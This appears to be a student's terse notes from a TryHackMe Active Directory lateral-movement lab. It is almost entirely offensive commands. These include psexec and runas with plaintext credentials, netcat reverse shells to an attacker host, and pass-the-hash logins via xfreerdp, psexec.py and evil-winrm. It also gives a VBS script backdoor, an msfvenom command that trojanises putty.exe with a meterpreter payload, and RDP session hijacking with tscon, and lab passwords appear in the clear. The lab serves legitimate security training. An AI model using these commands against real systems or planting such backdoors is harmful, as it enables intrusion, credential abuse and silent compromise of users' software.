```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

```
rachael.atkinson
Zjqf3489

```

```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

```



Connect to RDP using PtH:

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```


Connect via psexec using PtH:
```
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

Connect to WinRM using PtH:
```
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

# Backdooring .vbs Scripts
As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:

```
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

# Backdooring .exe Files
If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:
```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

# RDP Hijacking

List existing sessions:
```
query user
```

Connect to an existing RDP session:
```
tscon 3 /dest:rdp-tcp#6
```

Gain SYSTEM with administrator level access:
```
PsExec64.exe -s cmd.exe
```

xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_jessica.richards /p:o6R9PfosU